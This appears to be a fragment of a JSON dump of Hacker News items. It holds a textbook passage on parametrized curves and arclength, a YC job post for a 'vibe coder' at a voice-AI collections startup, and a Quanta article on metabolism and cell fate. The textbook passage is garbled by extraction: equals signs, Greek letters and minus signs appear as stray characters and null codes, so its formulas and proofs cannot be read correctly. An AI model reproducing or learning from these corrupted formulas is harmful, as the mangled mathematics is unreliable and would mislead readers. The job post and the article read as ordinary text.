OQ ,   \u0000 \u0000 !  QC   , and   \u0000 \u0000 !  CP   (see Figure 1.5):  \u0000 \u0000 !  OP   D  \u0000 \u0000 !  OQ   C  \u0000 \u0000 !  QC   C  \u0000 \u0000 !  CP  D   .at; 0/   C   .0; a/   C   . \u0000 a   sin   t;   \u0000 a   cos   t/;  and hence the function  ˛ .t/   D   .at   \u0000   a   sin   t; a   \u0000   a   cos   t/   D   a.t   \u0000   sin   t; 1   \u0000   cos   t/;   t   2   R  gives a parametrization of the cycloid. (g) A (circular)   helix   is the screw-like path of a bug as it walks uphill on a right circular cylinder at a constant slope or pitch. If the cylinder has radius   a   and the slope is   b=a , we can imagine drawing a line of that slope on a piece of paper   2\u0019a   units long, and then rolling the paper up into a cylinder. The line gives one revolution of the helix, as we can see in Figure 1.6. If we take the axis of the cylinder to be vertical, the projection of the helix in the horizontal plane is a circle of radius   a , and so we obtain the parametrization   ˛ .t/   D   .a   cos   t; a   sin   t; bt/ .\n\n4   C HAPTER   1. C URVES  F IGURE   1.6  Brief review of hyperbolic trigonometric functions.   Just as the circle   x 2   C y 2   D   1   is parametrized by   . cos   \u0012;   sin   \u0012 / , the portion of the hyperbola   x 2   \u0000   y 2   D   1   lying to the right of the   y -axis, as shown in Figure 1.7, is parametrized by   . cosh   t;   sinh   t/ , where cosh   t   D   e t   C   e \u0000 t  2   and   sinh   t   D   e t   \u0000   e \u0000 t  2   :  By analogy with circular trigonometry, we set tanh   t   D   sinh   t  cosh   t   and sech   t   D   1  cosh   t   . The following  (cosh   t,   sinh   t )  F IGURE   1.7 formulas are easy to check: cosh 2   t   \u0000   sinh 2   t   D   1;   tanh 2   t   C   sech 2   t   D   1  sinh 0 .t/   D   cosh   t ;   cosh 0 .t/   D   sinh   t ;   tanh 0 .t/   D   sech 2   t ;   sech 0 .t/   D \u0000   tanh   t   sech   t :\n\n÷ 1. E XAMPLES , A RCLENGTH   P ARAMETRIZATION   5  (h) When a uniform and flexible chain hangs from two pegs, its weight is uniformly distributed along its length. The shape it takes is called a   catenary . 1   As we ask the reader to check in Exercise 9, the catenary is the graph of   f .x/   D   C   cosh .x=C / , for any constant   C > 0 . This curve will appear  F IGURE   1.8 numerous times in this course.   O  Example 2.   One of the more interesting curves that arise “in nature” is the   tractrix . 2   The traditional story is this: A dog is at the end of a   1 -unit leash and buries a bone at   .0; 1/   as his owner begins to walk down the   x -axis, starting at the origin. The dog tries to get back to the bone, so he always pulls the leash taut as he is dragged along the tractrix by his owner. His pulling the leash taut means that the leash will be tangent to the curve. 3   When the master is at   .t; 0/ , let the dog’s position be   .x.t/; y.t// , and let the leash  F IGURE   1.9 make angle   \u0012.t/   with the positive   x -axis. Then we have   x.t/   D   t   C   cos   \u0012.t/ ,   y.t/   D   sin   \u0012.t/ , so tan   \u0012.t/   D   dy  dx   D   y 0 .t/  x 0 .t/   D   cos   \u0012.t/\u0012   0 .t/  1   \u0000   sin   \u0012.t/\u0012   0 .t/  :  Therefore,   \u0012   0 .t/   D   sin   \u0012.t/ .   Separating variables and integrating, we have   R   d\u0012=   sin   \u0012   D   R   dt , and so  t   D \u0000   ln . csc   \u0012   C   cot   \u0012 /   C   c   for some constant   c . Since   \u0012   D   \u0019=2   when   t   D   0 , we see that   c   D   0 . Now, since csc   \u0012   C   cot   \u0012   D   1   C   cos   \u0012  sin   \u0012   D   2   cos 2 .\u0012=2/  2   sin .\u0012=2/   cos .\u0012=2/   D   cot .\u0012=2/ , we can rewrite this as   t   D   ln tan .\u0012=2/ .  1 From the Latin   cat¯ ena , chain.  2 From the Latin   trahere, tractus , to pull.  3 It’s been pointed out to me many times that a live dog will always point straight toward the bone, and this gives a far different—and less interesting—curve; thus, some people have suggested dragging a brick instead. Some of my students years ago suggested dragging a dead dog. With apologies for their crass canine cruelty, rewrite this as you wish.\n\n6   C HAPTER   1. C URVES  Thus, we can parametrize the tractrix by  ˛ .\u0012 /   D   \u0000 cos   \u0012   C   ln tan .\u0012=2/;   sin   \u0012   \u0001 ;   \u0019=2   \u0014   \u0012 < \u0019 :  Alternatively, since tan .\u0012=2/   D   e t   , we have sin   \u0012   D   2   sin .\u0012=2/   cos .\u0012=2/   D   2e t  1   C   e 2t   D   2  e t   C   e \u0000 t   D   sech   t  cos   \u0012   D   cos 2 .\u0012=2/   \u0000   sin 2 .\u0012=2/   D   1   \u0000   e 2t  1   C   e 2t   D   e \u0000 t   \u0000   e t  e t   C   e \u0000 t   D \u0000   tanh   t ;  and so we can parametrize the tractrix instead by  ˇ .t/   D   \u0000 t   \u0000   tanh   t;   sech   t/;   t   \u0015   0:   O  The fundamental concept underlying the geometry of curves is the arclength of a parametrized curve.  Definition.   If   ˛ W   Œa; b   !   R 3   is a parametrized curve, then for any   a   \u0014   t   \u0014   b , we define its   arclength  from   a   to   t   to be   s.t/   D  Z   t a  k ˛ 0 .u/ k du .   That is, the distance a particle travels—the arclength of its trajectory—is the integral of its speed.  The discussion that follows here is totally optional. An alternative approach is to start with the following  Definition.   Let   ˛ W   Œa; b   !   R 3   be a (continuous) parametrized curve. Given a partition   P   D f a   D   t 0   < t 1   <   \u0001 \u0001 \u0001   < t k   D   b g   of the interval   Œa; b , let  `. ˛ ;   P /   D  k X  i D 1  k ˛ .t i   /   \u0000   ˛ .t i \u0000 1 / k :  That is,   `. ˛ ;   P /   is the length of the inscribed polygon with vertices at   ˛ .t i   / ,   i   D   0; : : : ; k , as indicated in  a   b  F IGURE   1.10 Figure 1.10. We define the   arclength   of   ˛   to be length . ˛ /   D   sup f `. ˛ ;   P /   W   P   a partition of   Œa; b g ;  provided the set of polygonal lengths is bounded above.\n\n÷ 1. E XAMPLES , A RCLENGTH   P ARAMETRIZATION   7  Now, using this definition, we can   prove   that the distance a particle travels is the integral of its speed. We will need to use the result of Exercise A.2.4.  Proposition 1.1.  Let   ˛ W   Œa; b   !   R 3  be a piecewise- C 1  parametrized curve. Then  length . ˛ /   D  Z   b a  k ˛ 0 .t/ k dt :  Proof.   For any partition   P   of   Œa; b , we have  `. ˛ ;   P /   D  k X  i D 1  k ˛ .t i   /   \u0000   ˛ .t i \u0000 1 / k D  k X  i D 1  Z   t i  t i   \u0000 1  ˛ 0 .t/dt   \u0014  k X  i D 1  Z   t i  t i   \u0000 1  k ˛ 0 .t/ k dt   D  Z   b a  k ˛ 0 .t/ k dt ;  so length . ˛ /   \u0014  Z   b a  k ˛ 0 .t/ k dt . The corresponding inequality holds on any interval. Now, for   a   \u0014   t   \u0014   b , define   s.t/   to be the arclength of the curve   ˛   on the interval   Œa; t . Then for   h > 0  we have  k ˛ .t   C   h/   \u0000   ˛ .t/ k  h   \u0014   s.t   C   h/   \u0000   s.t/  h   \u0014   1  h  Z   t   C h t  k ˛ 0 .u/ k du;  since   s.t   C   h/   \u0000   s.t/   is the arclength of the curve   ˛   on the interval   Œt; t   C   h . (See Exercise 8 for the first inequality and the first paragraph for the second.) Now lim  h ! 0 C  k ˛ .t   C   h/   \u0000   ˛ .t/ k  h   D k ˛ 0 .t/ k D   lim  h ! 0 C  1  h  Z   t   C h t  k ˛ 0 .u/ k du:  Therefore, by the squeeze principle, lim  h ! 0 C  s.t   C   h/   \u0000   s.t/  h   D k ˛ 0 .t/ k :  A similar argument works for   h < 0 , and we conclude that   s 0 .t/   D k ˛ 0 .t/ k . Therefore,  s.t/   D  Z   t a  k ˛ 0 .u/ k du;   a   \u0014   t   \u0014   b;  and, in particular,   s.b/   D   length . ˛ /   D  Z   b a  k ˛ 0 .t/ k dt , as desired.   \u0003  If   k ˛ 0 .t/ k D   1   for all   t   2   Œa; b , i.e.,   ˛   always has speed   1 , then   s.t/   D   t   \u0000   a . We say the curve   ˛   is  parametrized by arclength   if   s.t/   D   t   for all   t . In this event, we usually use the parameter   s   2   Œ0; L   and write   ˛ .s/ .  Example 3.   (a) Let   ˛ .t/   D   \u0000   1  3   .1   C   t/ 3=2 ;   1  3   .1   \u0000   t/ 3=2 ;   1 p 2   t \u0001 ,   t   2   . \u0000 1; 1/ . Then we have   ˛ 0 .t/   D  \u0000   1  2   .1   C   t/ 1=2 ;   \u0000   1  2   .1   \u0000   t/ 1=2 ;   1 p 2  \u0001 , and   k ˛ 0 .t/ k D   1   for all   t . Thus,   ˛   always has speed   1 . (b) The standard parametrization of the circle of radius   a   is   ˛ .t/   D   .a   cos   t; a   sin   t/ ,   t   2   Œ0; 2\u0019 , so   ˛ 0 .t/   D   . \u0000 a   sin   t; a   cos   t/   and   k ˛ 0 .t/ k   D   a .   It is easy to see from the chain rule that if we reparametrize the curve by   ˇ .s/   D   .a   cos .s=a/; a   sin .s=a// ,   s   2   Œ0; 2\u0019a , then   ˇ 0 .s/   D  . \u0000   sin .s=a/;   cos .s=a//   and   k ˇ 0 .s/ k   D   1   for all   s .   Thus, the curve   ˇ   is parametrized by arc- length.   O\n\n8   C HAPTER   1. C URVES  An important observation from a theoretical standpoint is that any regular parametrized curve can be  re parametrized by arclength. For if   ˛   is regular, the arclength function   s.t/   D  Z   t a  k ˛ 0 .u/ k du   is an increas- ing differentiable function (since   s 0 .t/   D k ˛ 0 .t/ k   > 0   for all   t ), and therefore has a differentiable inverse function   t   D   t.s/ . Then we can consider the parametrization  ˇ .s/   D   ˛ .t.s//:  Note that the chain rule tells us that  ˇ 0 .s/   D   ˛ 0 .t.s//t 0 .s/   D   ˛ 0 .t.s//=s 0 .t.s//   D   ˛ 0 .t.s//= k ˛ 0 .t.s// k  is everywhere a unit vector; in other words,   ˇ   moves with speed   1 .  EXERCISES 1.1  *1.   Parametrize the unit circle (less the point   . \u0000 1; 0/ ) by the (signed) length   t   indicated in Figure 1.11.  t  ( − 1,0) ( x,y )  F IGURE   1.11  ] 2.   Consider the helix   ˛ .t/   D   .a   cos   t; a   sin   t; bt/ . Calculate   ˛ 0 .t/ ,   k ˛ 0 .t/ k , and reparametrize   ˛   by arc- length. 3.   Let   ˛ .t/   D   \u0000   1 p 3   cos   t   C   1 p 2   sin   t;   1 p 3   cos   t;   1 p 3   cos   t   \u0000   1 p 2   sin   t \u0001 . Calculate   ˛ 0 .t/ ,   k ˛ 0 .t/ k , and reparam- etrize   ˛   by arclength. *4.   Parametrize the graph   y   D   f .x/ ,   a   \u0014   x   \u0014   b , and show that its arclength is given by the traditional formula length   D  Z   b a  q  1   C   \u0000 f   0 .x/ \u0001 2   dx:  5.   a.   Show that the arclength of the catenary   ˛ .t/   D   .t;   cosh   t/   for   0   \u0014   t   \u0014   b   is sinh   b . b.   Reparametrize the catenary by arclength. (Hint: Find the inverse of sinh by using the quadratic formula.) *6.   Consider the curve   ˛ .t/   D   .e t   ; e \u0000 t   ;   p 2t/ . Calculate   ˛ 0 .t/ ,   k ˛ 0 .t/ k , and reparametrize   ˛   by arclength, starting at   t   D   0 .",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "358527fe6882b6b9",
    "title": {
      "en": "Domu Technology Inc. (YC S24) Is Hiring a Vibe Coder",
      "ko": null,
      "ja": null
    },
    "type": "job",
    "url": "https://www.ycombinator.com/companies/domu-technology-inc/jobs/hwWsGdU-vibe-coder-ai-engineer",
    "score": 1,
    "by": "Nicoding27",
    "time": 1742691612,
    "content": "About Us:\nDomu is an enterprise voice AI startup crushing it in the financial services industry. We’ve tripled (ARR) with Fortune 500 customers and are on track to dominate the industry. Now, 50% of our code is written by AI, so we are a small engineering team. Putting in 12 to 15-hour days, the engineering team has traveled to +10 cities in the past half-year for product launches.\n\nWhat you will be doing:\n\nWe ship new features for our product daily.\nSolve deep product problems like how to collect more money with a voice AI agent.\nFigure out how to scale our infrastructure to handle millions of monthly calls.\nOnboard customers, talk to them and travel to visit them.\nStress test AI agents.\nYour onboarding will be making collection calls.\n\nRequirements:\nAt least 50% of the code you write right now should be done by AI; Vibe coding experience is non-negotiable.\nWork in-person in SF\n+3 years of experience.\nTrack record of shipping scalable products to end users\nReady to grind long hours, including weekends, to hit our ambitious goals.\nWilling to travel frequently to meet clients where they are.\nDown to do whatever it takes, including direct client interactions.\nWhat’s In It For You:\nEvery team member gets equity, and your compensation scales with our revenue, so your hustle directly impacts your earnings. You will be building tech that millions will use, including the world’s biggest banks and insurance companies, which will rely on your creations.\n\nWe will take you to all the office hours with some of the best voice AI builders in the world right now.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "8dd6872cca0d0d91",
    "title": {
      "en": "Metabolism Can Shape Cells' Destinies",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.quantamagazine.org/how-metabolism-can-shape-cells-destinies-20250321/",
    "score": 25,
    "by": "isaacfrond",
    "time": 1742570015,
    "content": "Quanta Homepage\n\n                                        Physics\n\n                                        Mathematics\n\n                                        Biology\n\n                                        Computer Science\n\n                                        Topics\n\n                                        Archive\n\n                                        Blog\n\n                                        Columns\n\n                                        Interviews\n\n                                        Podcasts\n\n                                        Puzzles\n\n                                        Multimedia\n\n                                        Videos\n\n                                        About Quanta\n\n                                    An editorially independent publication supported by the Simons Foundation.\n\n                                    Follow Quanta\n\n    Facebook\n\n        Youtube\n\n        Instagram\n\n    RSS\n\n                Newsletter\n\n                    Get the latest news delivered to your inbox.\n\n                            Email\n\n                        Subscribe\n\n                        Recent newsletters\n\n                                    Gift Store\n\n                                        Shop Quanta gear\n\nNewsletter\n\n                    Get the latest news delivered to your inbox.\n\n                            Email\n\n                        Subscribe\n\n                        Recent newsletters\n\nQuanta Homepage\n\n                                        Physics\n\n                                        Mathematics\n\n                                        Biology\n\n                                        Computer Science\n\n                                        Topics\n\n                                        Archive\n\n        Saved articles\n\n                    Saved Articles\n                                            Create a reading list by clicking the Read Later icon next to the articles you wish to save.\n\n                            See all saved articles\n\n        Login\n\n                    Log out\n\n                    Change password\n\n                                Search\n\nHome\n\n                How Metabolism Can Shape Cells’ Destinies\n\n        Comment\n\n        Save Article\n\n                    Read Later\n\n                                                Share\n\n    Facebook\n\n                            Copied!\n\n    Copy link\n         (opens a new tab)\n\n    Email\n\n    Pocket\n\n    Reddit\n\n    Ycombinator\n\ndevelopmental biology\n    How Metabolism Can Shape Cells’ Destinies\n\n        By\n\n                Viviane Callier\n\nMarch 21, 2025\n\n            A growing body of work suggests that cell metabolism — the chemical reactions that provide energy and building materials — plays a vital, overlooked role in the first steps of life.\n\n        Comment\n\n        Save Article\n\n                    Read Later\n\ndevelopmental biology\n    How Metabolism Can Shape Cells’ Destinies\n\n        By\n\n                Viviane Callier\n\nMarch 21, 2025\n\n            A growing body of work suggests that cell metabolism — the chemical reactions that provide energy and building materials — plays a vital, overlooked role in the first steps of life.\n\n        Comment\n\n        Save Article\n\n                    Read Later\n\nThe embryo of a fruit fly grows and then forms layers of specialized cells. New research shows how metabolism influences these early developmental steps.\n\n                            Bruno C. Vellutini\n\nEach of us starts life as a single cell. To develop into a complex, multicellular being, that cell must divide, and then those cells must divide again, and again — and then these stem cells start to specialize into different types, with different destinies in our bodies. In the first week, our cells reach their first turning point: They must become either placenta or embryo. Then, in the developing embryo, cells form three primary layers — ectoderm, mesoderm and endoderm — which, over time, become skin, neurons, heart, gut, and so on.\nThese determinations of cells’ fates — what type of specialized cell they will become — occur in stages throughout embryonic development. Because each cell type has a characteristic pattern of gene activity, scientists assumed that the decisions cells make are dictated by genes: specifically, networks of genes that turn each other on and off, initiating a cascade that forms the correct types of cells in the correct order.\nBut genes are not the whole story. New research has shown the extent to which cell metabolism — the chemical reactions within a cell that provide energy and materials for growth — has an important, underappreciated role in directing cell fates.\n“Metabolism is more than just housekeeping in stem cells, especially embryonic stem cells,” said Jan Żylicz (opens a new tab), a developmental biologist at the University of Copenhagen. “It’s a crucial pathway that regulates decision-making processes.”\nIn the course of their whirring biochemical activity, cells not only produce energy but also synthesize metabolites: molecular biological building blocks, such as amino acids, nucleotides, carbohydrates and lipids. In the last decade or two, with the development of better methods for measuring metabolites in cells, there has been a surge of interest in the various ways these small molecules regulate gene activity, and in particular cell fate and development. Now, studies suggest that their presence or absence — which can be influenced by external factors, such as environment and diet — can determine the fate of a cell and, in turn, the development of an embryo.\n\nThe developmental biologist Jan Żylicz has seen how a single type of metabolite can change the fate of a cell during the earliest stages of human development.\n\n    Courtesy of Jan Zylicz/UCPH, Denmark\n\n“Beyond the bioenergetics, these by-products of metabolism are used for regulating specialized programs as well,” such as cell differentiation and the formation of an embryo’s three layers, said Berna Sozen (opens a new tab), a developmental biologist at Yale University who recently published research in Nature showing how glucose metabolism (opens a new tab) influences the earliest stages of embryonic development. “The possibilities are so exciting. It really changes the way we think about developmental biology, the way we think about how our own life starts.”\nScientists have traditionally believed that all the instructions a cell needs to become a particular type are encoded in its DNA. In that case, when a stem cell differentiates, part of that execution involves turning on the genes that encode that cell type’s metabolism, said Jared Rutter (opens a new tab), a biochemist at the University of Utah. But studies now show that the operation can run backward: The cell tests whether it has the materials in its environment. If it cannot execute the metabolism, then it won’t become that cell type, in spite of signals to differentiate. “It’s a revolution in my thinking of how metabolism influences things,” Rutter said.\nThe body of work overturns assumptions about the pure dominance of genes during development and helps us understand the factors that contribute to an embryo’s survival, cell death and even cancer.\n“Almost any question is on the table,” said Lydia Finley (opens a new tab), a cancer biologist at Memorial Sloan Kettering Cancer Center in New York. “The field of metabolism and development is really developing now, which is super exciting, because it’s early, early days.”\n\nLydia Finley of Memorial Sloan Kettering Cancer Center discovered that the anti-tumor protein p53 helps prevent cancer by managing a cell’s metabolic state.\n\n    Memorial Sloan Kettering Cancer Center\n\nEarly Signals\nOne of the most striking examples of how metabolism can drive cell differentiation comes from a humble slime mold. When Dictyostelium has plenty of nutrients in its environment, it happily grows and divides as a group of single cells. But when food dries up, a change occurs: Individual cells aggregate and form a sort of multicellular slug, which crawls as a single unit and forms fruiting bodies to reproduce. While food availability is the obvious trigger for the change, until recently no one knew how exactly it flips the switch from unicellularity to multicellularity — a form of cell fate — at the molecular level.\nFour years ago, the immunologist Erika Pearce (opens a new tab) and her team studying cell metabolism at Johns Hopkins University discovered how this switch is metabolically driven (opens a new tab). Under starvation conditions, Dictyostelium mitochondria generate a burst of reactive oxygen species — small, unstable molecules that can damage proteins and DNA, and can also act as signaling molecules. To protect itself from its own mitochondria, the cell produces an antioxidant called glutathione.\nGlutathione doesn’t come out of nowhere: It requires the nutrient sulfur. A starving slime mold cell shunts all of its sulfur into glutathione production. That means there’s no sulfur left to build iron-sulfur complexes, without which the cell can’t make new mitochondria. Therefore, the slime mold “has no choice but to become multicellular,” Pearce said. It can’t grow and spread on its own anymore, so it forms a slug and heads off in search of food.\n\n                    When food is scarce, the Dictyostelium slime mold abandons a unicellular lifestyle and switches into a sluglike multicellular form with fruiting bodies (pictured here). At a cellular level, this change is driven by the lack of a single nutrient: sulfur.\n\n    Eye of Science/ Science Source\n\n“Metabolism was driving that entire phenotype, and whether or not you had food there — that is probably still the most fundamental driving force,” Pearce said. “Every single one of our cells is probably subjected to that as well.”\nThis discovery showed that a cell’s metabolic state can trigger a signaling cascade that completely changes an organism’s form and behavior. However, understanding how cell metabolism is translated into a developmental signal in organisms more complex than slime molds had taken decades of work.\nBack in the 1990s, the biologist Navdeep Chandel (opens a new tab) was a graduate student working on a mitochondrial enzyme called cytochrome c oxidase. “I was a pretty confident young lad thinking I know what cytochrome c oxidase does: It takes an electron from cytochrome c and gives it to oxygen,” he said — a key part of the mitochondria’s process for creating cellular energy in the form of adenosine triphosphate (ATP). But surprisingly, in 1996, researchers discovered that if cytochrome c is released from the mitochondria, it sets off a cascade of signals (opens a new tab) that triggers cell death — also a kind of cell fate decision.\n“So it [cytochrome c] has a second function, a moonlighting function, you could call it,” Chandel said. That was the first hint that mitochondria were doing more than just providing ATP: They were also influencing cell decision-making. Chandel, now a mitochondrial biologist at Northwestern University Feinberg School of Medicine, has been working on elucidating mitochondrial signaling ever since.\nWorking with human stem cells more than a decade ago, he discovered that mutating a critical mitochondrial enzyme prevented the cells from differentiating (opens a new tab) into fat cells as they should have. In 2013, his lab showed that reactive oxygen species generated by mitochondria were essential signals (opens a new tab) in mouse skin development. Then, in 2023, in an experiment published in Nature, he and his team again found that cell specialization could not happen without healthy, functioning mitochondria. In a mouse model, stem cells with defective mitochondria unleashed a stress response — a cascade of molecular signals that activated stress-response genes in the nucleus — and then the cells stalled out, unable to become lung cells (opens a new tab). The mice’s lungs failed to develop, and they died.\n\nNavdeep Chandel, a biologist at Northwestern University, has spent his career elucidating how mitochondrial signals affect cell specialization and animal development.\n\n    Northwestern Medicine\n\nThe stress response, Chandel concluded, was an emergency message to the nucleus to stop development when the mitochondria encountered a metabolic problem.\n“When we started these experiments, most people would say, ‘Oh my God, what a dumb experiment, you’re going to get dead cells,’” he said. “But hang on. We haven’t seen that. We’ve seen specific defects — the defects being [cells] not differentiated. I think that’s quite cool.”\nOver the past few years, other research projects have independently tied mitochondria’s emergency stress response to cells’ failure to differentiate. For example, in fruit flies, defects in metabolic enzymes in a subset of tissues can trigger a stress response that halts the growth and development (opens a new tab) of the entire animal. By genetically blocking the stress response, the researchers reversed the effect.\nMost recently, in February 2025 in Science, the endocrinologist Scott Soleimanpour (opens a new tab) at the University of Michigan found that in mice with defective mitochondria, beta cells (special cells that produce insulin) were de-differentiating — losing their identity as beta cells (opens a new tab) and reverting to a more immature state. By inhibiting the stress response, his team could get the beta cells to re-differentiate, much as Chandel could restore the lung cells in his mice if he suppressed their stress response.\n\n                    What Makes Life Tick? Mitochondria May Keep Time for Cells\n\n                developmental biology\n\n                    What Makes Life Tick? Mitochondria May Keep Time for Cells\n\n            September 18, 2023\n\n        Comment\n\n        Save Article\n\n                    Read Later\n\nResearchers already knew that mitochondria under stress can send signals to other parts of the cell. These studies help clarify the message. “The animal knows there’s something wrong at a metabolic level, and it releases signals to slow down development,” said the geneticist Jason Tennessen (opens a new tab) of Indiana University, who led the fruit fly studies.\nThe research has flipped how Tennessen thinks about the relationship between genetics and metabolism. “Instead of thinking about the gene expression networks just happening to interact with metabolism, it’s really metabolism driving [developmental decision-making],” he said, “and gene expression networks are the tools by which that occurs.”\nThis idea — that cell metabolism is an integral but unheralded part of the developmental process — isn’t fantastical. In another field of biology, epigenetics, researchers have already detailed the process by which metabolites turn genes on and off. But they needed the work of developmental biologists to connect more of the dots.\nThe Metabolic Nucleus\nNearly all the different cell types in your body — liver cells, heart cells, skin cells, beta cells, and so on — contain the same genome in their nuclei. What differentiates them is how the gene activity is regulated. In each cell type, a different set of genes is expressed to make the proteins and RNA that allow them to function properly in their respective roles in a mature body.\nEpigeneticists who study this process have, over the past few decades, elucidated a complex system by which proteins and enzymes activate or repress certain genes. The meters-long strand of DNA in every cell is wound around proteins called histones. With the help of specific enzymes, molecules that scientists call “chemical modifications” or “epigenetic marks” attach to the histones and cause the DNA to unspool, exposing different genes for activation. These modifications can thereby activate some genes and deactivate others, influencing the biochemical processes in a cell and therefore the functions that cell performs.\n\nMark Belan/Quanta Magazine\n\n“Those chemical modifications that decorate [histones] and modify gene expression — they’re metabolites, full stop,” said Finley, the cancer biologist. “Chemical modifications themselves are metabolites, and their removal is dependent on metabolites.”\nFifteen years ago, when Kathryn Wellen (opens a new tab) was a postdoc studying cancer cells, she discovered that the epigenetic marks on histones change in response to the presence of nutrients. When food is plentiful, mitochondria make a metabolite called acetyl-CoA. It diffuses into the nucleus, where the genome resides, through large pores. There, enzymes break down the metabolites into epigenetic marks known as acetyl groups and place them on histones to activate one set of genes. However, when the cells are starving, enzymes strip off the acetyl groups. Some of those acetyl groups are turned back into acetyl-CoA and consumed for energy, while others are recycled to activate a different set of genes.\nClearly there’s a lot of metabolic activity occurring in the nucleus. Wellen wondered whether the nucleus had its own unique metabolism and could therefore be considered a “metabolic compartment.” Working with Nate Snyder (opens a new tab), a biochemist at the Lewis Katz School of Medicine at Temple University, Wellen and other researchers developed new methods to measure metabolites in different parts of the cell and saw that metabolic activity in the nucleus (opens a new tab) is not identical to activity occurring elsewhere.\n\n                    Kathryn Wellen, who studies metabolism and epigenetics, discovered that the nucleus is a metabolic compartment with unique metabolic activity.\n\n    Penn Medicine\n\n“Although that may sound obvious, it was not,” Wellen said. The nucleus’s metabolic activity was specific to the functions in that compartment, including epigenetic activity. “There are a lot of metabolic enzymes that are actually in the nucleus and are dynamically regulated in the nucleus,” said Wellen, who now heads a lab at the University of Pennsylvania. “We were really excited to find that.”\nThis idea of the nucleus as a metabolic compartment was foundational to understanding how metabolism impacts embryonic development. In early embryonic cells, as developmental decisions are made that direct cells to become ectoderm, mesoderm and endoderm, all of the epigenetic marks on the histones get repositioned. They can be removed, added and relocated to activate certain genes and repress others.\n“What is intriguing is that all of this is associated with a massive accumulation of metabolic enzymes in the nucleus,” said Żylicz, the developmental biologist. These enzymes make molecules, which then activate other enzymes that remove epigenetic marks and lay down new ones as cells grow, divide and take on different fates.\nDuring this period, the cell moves many enzymes (opens a new tab) from the cytoplasm and mitochondria to the nucleus. That way, the metabolites necessary for gene activity can be produced locally, in the nucleus, where they are needed, Żylicz said. “The moment where you reprogram the epigenome — that happens to be the same time when you’re also really using this nucleus as a metabolic compartment.”\nEarly in human development, the embryo is a ball of cells. The cells on the outside form the placenta; the cells on the inside form the embryo. The major difference between these two types of cells is in the activity of metabolic genes. Recently, Żylicz’s team pinpointed differences between these cells in alpha-ketoglutarate, a well-studied metabolite, and showed that the metabolite accelerated the differentiation (opens a new tab) of stem cells into cells that will become the placenta.\n\n                Related:\n\n                                    Cell by Cell, Scientists Map the Genetic Steps as Eggs Become Animals\n\n                                    Cells Across the Body Talk to Each Other About Aging\n\n                                    In the Ticking of the Embryonic Clock, She Finds Answers\n\n                                    Cellular Self-Destruction May Be Ancient. But Why?\n\nAlpha-ketoglutarate not only controls differentiation in stem cells; it does the same in cancer cells, Finley’s team and other groups found a few years ago. They were studying p53, a protein that is well known for its anticancer effects; its gene is the most commonly mutated gene in human cancer. Their study, published inNature, found that p53 caused alpha-ketoglutarate to accumulate; this alpha-ketoglutaratealtered the fate of the cancer cells (opens a new tab) so that they were less likely to form tumors. This was striking and unexpected because researchers had assumed that p53 has an anticancer effect by directly regulating the activity of genes. It also works by altering metabolism.\n“This is particularly exciting because if changing metabolism can change cell fate in a meaningful way, there is the possibility that you might be able to manipulate that therapeutically, where aberrant decisions of differentiation are causal for the disease — like in many forms of cancer,” said Rutter, who was not involved in the study.\nIn some ways, this interplay between metabolism and genes is obvious: We know that life is influenced by both its genes and its environment. This new, exciting field of research shows at a molecular level how the materials available to our cells influence their fates, and ours.\n\nBy Viviane Callier\n                Contributing Writer\n\n                March 21, 2025\n\n                    View PDF/Print Mode\n\n                            biology\n\n                            cancer\n\n                            cells\n\n                            development\n\n                            developmental biology\n\n                            DNA\n\n                            epigenetics\n\n                            gene regulation\n\n                            metabolism\n\n                            mitochondria\n\n                            stem cells\n\n                    All topics\n\n     (opens a new tab)\n\nShare this article\n\n    Facebook\n\n                            Copied!\n\n    Copy link\n         (opens a new tab)\n\n    Email\n\n    Pocket\n\n    Reddit\n\n    Ycombinator\n\n                    Newsletter\n\n                    Get Quanta Magazine delivered to your inbox\n\n                    Subscribe now\n\n                    Recent newsletters\n\n             (opens a new tab)\n\nThe Quanta Newsletter\n\n                    Get highlights of the most important news delivered to your email inbox\n\n                            Email\n\n                        Subscribe\n\n                        Recent newsletters\n                                             (opens a new tab)\n\nAlso in Biology\n\n                    How Did Multicellular Life Evolve?\n\n                The Joy of Why\n\n                    How Did Multicellular Life Evolve?\n\n        By\n\n                    Janna Levin\n\n                 +1 authors\n\n                        Steven Strogatz\n\n            March 20, 2025\n\n        Comment\n\n        Save Article\n\n                    Read Later\n\n                    A New, Chemical View of Ecosystems\n\n                ecology\n\n                    A New, Chemical View of Ecosystems\n\n        By\n\n                Molly Herring\n\n            March 5, 2025\n\n        Comment\n                1\n\n        Save Article\n\n                    Read Later\n\n                    The ‘Elegant’ Math Model That Could Help Rescue Coral Reefs\n\n                mathematical biology\n\n                    The ‘Elegant’ Math Model That Could Help Rescue Coral Reefs\n\n        By\n\n                Max G. Levy\n\n            February 26, 2025\n\n        Comment\n                1\n\n        Save Article\n\n                    Read Later\n\nComment on this article\n\n                    Quanta Magazine moderates comments tofacilitate an informed, substantive, civil conversation. Abusive, profane, self-promotional, misleading, incoherent or off-topic comments will be rejected. Moderators are staffed during regular business hours (New York time) and can only accept comments written in English.\n\n        Show comments\n\nNext article\n                How Did Multicellular Life Evolve?\n\nQuanta Homepage\n\n    Facebook\n\n        Youtube\n\n        Instagram\n\n                                        About Quanta\n\n                                        Archive\n\n                                        Contact Us\n\n                                        Terms & Conditions\n\n                                        Privacy Policy\n\n                        All Rights Reserved © 2025\n\n                    An editorially independent publication supported by the Simons Foundation.\n\n                        Simons Foundation\n\nQuanta Homepage\n\n    Facebook\n\n        Youtube\n\n        Instagram\n\nAbout Quanta\n\n                                        Archive\n\n                                        Contact Us\n\n                                        Terms & Conditions\n\n                                        Privacy Policy\n\nAll Rights Reserved © 2025\n\n                    An editorially independent publication supported by the Simons Foundation.\n\n                        Simons Foundation\n\nClose\n\n    Log in to Quanta\n\n            Use your social network\n\n                        Facebook                        Connect with Facebook\n\n                                                Connect with Google\n\n            or\n\n                    email\n\n                    password\n\n                    Remember me\n\n                        Forgot your password ?\n\n    Don't have an account yet?\n         Sign up\n\nClose\n\n        Forgot your password?\n        We’ll email you instructions to reset your password\n\n                email\n\nClose\n\n        Change your password\n        Enter your new password\n\n                Password\n\n                Retype new password\n\nClose\n\n        Sign Up\n\n                    First Name\n\n                    Last Name\n\n                    Email\n\n                    Password\n\n                    Retype Password\n\n            Creating an account means you accept Quanta Magazine's\n\n            Terms & Conditions and Privacy Policy",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
